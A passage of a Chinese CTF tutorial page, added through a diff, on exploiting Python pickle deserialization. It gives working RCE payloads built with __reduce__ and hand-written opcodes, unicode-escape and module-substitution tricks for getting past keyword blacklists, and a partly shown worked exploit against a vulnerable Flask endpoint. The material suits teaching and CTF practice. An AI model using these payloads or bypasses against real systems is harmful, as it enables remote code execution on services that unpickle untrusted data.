+<p>逐条读：<code>c</code> 压入 <code>os.system</code>；<code>(</code> 打标记；<code>S'echo pwned'</code> 压入字符串；<code>t</code> 组成元组 <code>('echo pwned',)</code>；<code>R</code> 执行 <code>os.system('echo pwned')</code>；<code>.</code> 结束。本地验证：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="sa">b</span><span class="s2">"cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S'echo pwned'</span><span class="se">\n</span><span class="s2">tR."</span><span class="p">)</span>  <span class="c1"># 屏幕上打印 pwned</span>
+</code></pre></div>
+<h2 id="__reduce__"><code>__reduce__</code> 魔术方法<a class="headerlink" href="#__reduce__" title="Permanent link">¶</a></h2>
+<p>手写 opcode 之前，大多数题目用 <code>__reduce__</code> 配合 <code>pickle.dumps()</code> 自动生成 payload 就够了。</p>
+<p><code>__reduce__</code> 是类的魔术方法，定义"这个对象被序列化时应该变成什么"。它最常见的返回形式是一个二元组：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">return</span> <span class="p">(</span><span class="nb">callable</span><span class="p">,</span> <span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">,</span> <span class="o">...</span><span class="p">))</span>
+</code></pre></div>
+<p>含义是：反序列化时，用 <code>callable(*args)</code> 来重建这个对象。pickle 会为它生成上面那种 <code>c...( t R .</code> 结构的 opcode。换句话说，<strong><code>__reduce__</code> 就是我们把任意函数调用塞进 pickle 数据的合法接口</strong>——它之于 pickle，相当于 POP 链终点那个 <code>eval</code>/<code>system</code> 之于 PHP。</p>
+<p>最小示例：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">RCE</span><span class="p">:</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">'echo pwned'</span><span class="p">,))</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">(),</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c1"># b'cposix\nsystem\np0\n(Vecho pwned\np1\ntp2\nRp3\n.'</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  <span class="c1"># 反序列化的瞬间命令就执行了</span>
+</code></pre></div>
+<p>注意输出里写的是 <code>cposix\nsystem\n</code> 而不是 <code>os</code>：Linux 上 <code>os.system</code> 的真实归属模块是 <code>posix</code>，pickle 按引用序列化时会记录真实模块名。这一点在做关键词黑名单题目时很重要，后面会用到。</p>
+<p>两个补充，做题时知道即可：</p>
+<ul>
+<li><code>__reduce_ex__(self, protocol)</code> 和 <code>__reduce__</code> 作用相同，只是多接收一个协议版本参数，且 <strong>优先级更高</strong>；两者都存在时以 <code>__reduce_ex__</code> 为准。</li>
+<li><code>__reduce__</code> 除了二元组还能返回更多元素（设置对象状态、迭代器等），CTF 里基本用不到，够用了。</li>
+</ul>
+<h2 id="rce-payload">构造 RCE payload<a class="headerlink" href="#rce-payload" title="Permanent link">¶</a></h2>
+<h3 id="os">用 <code>os</code> 执行命令<a class="headerlink" href="#os" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">RCE</span><span class="p">:</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">'cat /flag'</span><span class="p">,))</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())))</span>
+</code></pre></div>
+<p>题目接收形式通常是 base64 或 URL 编码后的字符串（因为 pickle 数据是二进制），本地生成后提交即可。如果要回显结果，用 <code>os.popen('cmd').read</code> 不行——<code>os.popen</code> 返回的是文件对象，<code>pickle</code> 的 <code>R</code> 调用返回什么并不影响命令已经执行这个事实；需要回显一般用 <code>subprocess</code>。</p>
+<h3 id="subprocess">用 <code>subprocess</code> 执行命令并拿到输出<a class="headerlink" href="#subprocess" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">subprocess</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">RCE</span><span class="p">:</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">,</span> <span class="p">([</span><span class="s1">'cat'</span><span class="p">,</span> <span class="s1">'/flag'</span><span class="p">],))</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())))</span>
+</code></pre></div>
+<p><code>subprocess.getoutput('cat /flag')</code>、<code>subprocess.call</code> 等同理，挑题目黑名单没拦的用。如果命令执行成功但页面没有回显，可以考虑把 flag 写到题目能读到的位置（比如源码文件、静态目录），或者用带外（DNSLog、反弹 shell）的方式把数据带出来——这和 <a href="../rce/">RCE</a> 一章里无回显命令执行的思路完全一样。</p>
+<h2 id="opcode-pker">手写 opcode 与 pker<a class="headerlink" href="#opcode-pker" title="Permanent link">¶</a></h2>
+<h3 id="_2">什么时候需要手写<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p><code>pickle.dumps()</code> 生成的 opcode 是"标准答案"：模块名、函数名以明文出现在字节流里，比如 <code>os</code>、<code>system</code>。一旦题目做了关键词黑名单，<code>dumps</code> 的产物往往直接撞墙。这时就需要 <strong>手写 opcode</strong>：opcode 只是字节流，同一个语义有很多种写法，黑名单通常挡不住。</p>
+<p>手写流程固定三步：</p>
+<ol>
+<li>按前面的 opcode 表把指令拼成 <code>bytes</code>；</li>
+<li>本地 <code>pickle.loads()</code> 验证能执行；</li>
+<li><code>base64.b64encode</code> 后提交。</li>
+</ol>
+<p>例如把 <code>os.system</code> 换成 protocol 2+ 的写法：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">pickletools</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"Vos</span><span class="se">\n</span><span class="s2">"</span>          <span class="c1"># 压入 'os'</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>           <span class="sa">b</span><span class="s2">"Vsystem</span><span class="se">\n</span><span class="s2">"</span>      <span class="c1"># 压入 'system'</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>           <span class="sa">b</span><span class="s2">"</span><span class="se">\x93</span><span class="s2">"</span>           <span class="c1"># STACK_GLOBAL -&gt; os.system</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>           <span class="sa">b</span><span class="s2">"(S'echo pwned'</span><span class="se">\n</span><span class="s2">"</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>           <span class="sa">b</span><span class="s2">"tR."</span><span class="p">)</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>     <span class="c1"># 检查每条指令是否符合预期</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>        <span class="c1"># 本地验证</span>
+</code></pre></div>
+<p><code>pickletools.dis()</code> 在这里就是你的调试器：每条指令执行后栈的变化都能看出来，拼错了立刻能发现。另外 <code>pickletools.optimize()</code> 可以把一段 opcode 压缩到最短，payload 有长度限制时有用。</p>
+<h3 id="pker">pker 工具<a class="headerlink" href="#pker" title="Permanent link">¶</a></h3>
+<p>GitHub 上有一个名为 <strong>pker</strong> 的开源工具，专门解决手写 opcode 的繁琐问题：你用它定义的一套抽象语法（<code>GLOBAL</code>、<code>INST</code>、<code>OBJ</code>、<code>REDUCE</code>、<code>BUILD</code> 等关键字，写法类似函数调用）描述想执行的操作，它自动生成对应的 pickle opcode，memo 编号之类的细节都帮你处理好。遇到需要构造复杂 payload（比如链式 <code>BUILD</code> 改对象属性）时比纯手写省心得多。工具的具体语法以项目 README 为准，安装使用前建议先在本地虚拟机里测试。</p>
+<h2 id="_3">过滤绕过<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<h3 id="_4">黑名单挡的是"名字"，不是功能<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p>黑名单检查的是 payload 字节流里有没有出现某些关键词，而执行同一个功能往往有多个等价的"入口名字"：</p>
+<ul>
+<li><code>os</code> 被禁：换 <code>subprocess</code>、<code>posix</code>（Linux）、<code>nt</code>（Windows）；</li>
+<li><code>system</code> 被禁：换 <code>os.popen</code>、<code>subprocess.getoutput</code> / <code>check_output</code> / <code>call</code>；</li>
+<li>危险函数全被禁但 <code>builtins</code> 没禁：试试 <code>__import__('os').system(...)</code> 的思路，opcode 层面用 <code>cbuiltins\n__import__\n</code> 先把模块拿回来再组合调用；</li>
+<li>实在没有命令执行函数可用，还可以降级为读写文件：<code>c__builtin__\nopen\n</code>（Python2）或 <code>cbuiltins\nopen\n</code> 读 flag，或用 <code>codecs</code>、<code>io</code> 模块。</li>
+</ul>
+<h3 id="sysmodules"><code>sys.modules</code> 被改掉<a class="headerlink" href="#sysmodules" title="Permanent link">¶</a></h3>
+<p>有的题目会这样"禁用"模块：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'not allowed'</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">'sys'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'not allowed'</span>
+</code></pre></div>
+<p>这会让后续 <code>import os</code> 拿到一个字符串而不是模块，<code>cos\nsystem\n</code> 也就失效了。但这种防护挡不住 <strong>别的模块</strong>——直接用 <code>subprocess</code> 就行，它没被替换。本书 <a href="../php_unser/">PHP反序列化</a> 章末尾就有一道这样的 pickle 例题（<code>/ppicklee</code> 路由），可以对照着做。</p>
+<h3 id="_5">字符串编码绕过关键词匹配<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<p>黑名单一般是这样写的：<code>if b'os' in pickle_data</code>。它匹配的是 <strong>原始字节</strong>，而 opcode 里的字符串是有编码余地的。<code>V</code>（UNICODE）指令支持 <code>\uXXXX</code> 转义：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"V</span><span class="se">\\</span><span class="s2">u006fs</span><span class="se">\n</span><span class="s2">"</span>        <span class="c1"># 解码后是 'os'，但字节流里没有 "os" 这两个字符</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>           <span class="sa">b</span><span class="s2">"Vsyste</span><span class="se">\\</span><span class="s2">u006d</span><span class="se">\n</span><span class="s2">"</span>    <span class="c1"># 解码后是 'system'</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>           <span class="sa">b</span><span class="s2">"</span><span class="se">\x93</span><span class="s2">"</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>           <span class="sa">b</span><span class="s2">"(S'echo pwned'</span><span class="se">\n</span><span class="s2">"</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>           <span class="sa">b</span><span class="s2">"tR."</span><span class="p">)</span>
+</code></pre></div>
+<p>反序列化时 <code>V</code> 指令会把 <code>\u006f</code> 解码回 <code>'o'</code>，<code>STACK_GLOBAL</code> 拿到的还是 <code>os.system</code>，但黑名单的字节匹配扑空了。同理，<code>S</code> 指令里的 <code>\x</code> 转义、长短协议版本之间切换（<code>c</code> 换 <code>\x93</code>+<code>V</code>），都是"同一语义、不同字节"的绕过素材。</p>
+<h3 id="restrictedunpickler">RestrictedUnpickler<a class="headerlink" href="#restrictedunpickler" title="Permanent link">¶</a></h3>
+<p>比黑名单更严格的写法是重写 <code>find_class()</code>，只允许白名单模块/函数被反序列化：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">class</span><span class="w"> </span><span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s1">'builtins'</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">'dict'</span><span class="p">,</span> <span class="s1">'list'</span><span class="p">):</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>            <span class="k">return</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s1">'forbidden'</span><span class="p">)</span>
+</code></pre></div>
+<p>因为 <code>c</code>、<code>i</code>、<code>\x93</code> 这些指令最终都会走到 <code>find_class()</code>，白名单之外的函数名编码得再花也进不来。这种题目的正确思路不是硬刚 opcode，而是 <strong>审计白名单里放了什么</strong>：如果白名单里混进了能间接执行代码的东西（比如某些库函数、题目自己写的类），就还有戏；如果白名单只有纯数据结构，那多半考点不在这里，回头找找别的入口。</p>
+<h2 id="ctf-pickle">CTF 例题：一道黑名单过滤的 pickle<a class="headerlink" href="#ctf-pickle" title="Permanent link">¶</a></h2>
+<p>题目给出了 Web 服务的源码：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'system'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'eval'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'exec'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'open'</span><span class="p">,</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>             <span class="sa">b</span><span class="s1">'flag'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'subprocess'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'builtins'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'import'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'pickle'</span><span class="p">]</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>    <span class="k">return</span> <span class="s1">'give me some pickles'</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/pickle'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'POST'</span><span class="p">])</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">do_pickle</span><span class="p">():</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>    <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>        <span class="n">raw</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>        <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>            <span class="k">if</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">raw</span><span class="p">:</span>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>                <span class="k">return</span> <span class="s1">'Hacker!'</span>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>        <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>        <span class="k">return</span> <span class="s1">'pickle done'</span>
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>        <span class="k">return</span> <span class="s1">'error'</span>
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="_6">分析<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<ul>
+<li>入口在 <code>/pickle</code>，POST 参数 <code>data</code> 经 base64 解码后送进 <code>pickle.loads()</code>，典型反序列化点。</li>
+<li>黑名单很长：<code>os</code>、<code>system</code>、<code>subprocess</code>、<code>builtins</code> 等常用名字全被按字节匹配拦掉了，连 <code>flag</code> 这个词都不能出现。</li>
+<li>注意黑名单是 <strong>字节匹配</strong>，而且 <code>V</code> 指令的 <code>\uXXXX</code> 转义恰好能把任何字符编码成"不含原字符"的字节——突破口在这。</li>
+</ul>
+<h3 id="_7">失败的尝试<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>先用标准流程生成 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">RCE</span><span class="p">:</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">'cat /flag'</span><span class="p">,))</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())))</span>
+</code></pre></div>
+<p>提交后返回 <code>Hacker!</code>。原因很明显：序列化结果里明文带着 <code>posix</code>（含 <code>os</code>）、<code>system</code>、<code>cat /flag</code>，一下撞上三个关键词。换 <code>subprocess.getoutput</code> 也一样——<code>subprocess</code> 本身就在黑名单里。</p>
+<h3 id="opcode-unicode">解题：手写 opcode + unicode 转义<a class="headerlink" href="#opcode-unicode" title="Permanent link">¶</a></h3>
+<p>思路：<code>V</code> 指令把模块名和函数名全部转义掉，让黑名单匹配不到任何关键词；命令里用通配符 <code>/f*</code> 代替 <code>/flag</code>（<code>subprocess.getoutput</code> 走 shell，通配符会展开；这里我们直接用 shell 命令字符串配合 <code>os.system</code> 也一样展开）。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">pickletools</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"V</span><span class="se">\\</span><span class="s2">u006fs</span><span class="se">\n</span><span class="s2">"</span>         <span class="c1"># 'os'</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>           <span class="sa">b</span><span class="s2">"Vsyste</span><span class="se">\\</span><span class="s2">u006d</span><span class="se">\n</span><span class="s2">"</span>     <span class="c1"># 'system'</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>           <span class="sa">b</span><span class="s2">"</span><span class="se">\x93</span><span class="s2">"</span>                <span class="c1"># STACK_GLOBAL -&gt; os.system</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>           <span class="sa">b</span><span class="s2">"(S'cat /f*'</span><span class="se">\n</span><span class="s2">"</span>       <span class="c1"># 命令：/f* 展开为 /flag，且不含 "flag"</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>           <span class="sa">b</span><span class="s2">"tR."</span><span class="p">)</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="c1"># 本地先验证指令序列正确、命令确实会执行</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s1">'os'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'system'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'eval'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'exec'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'open'</span><span class="p">,</span>
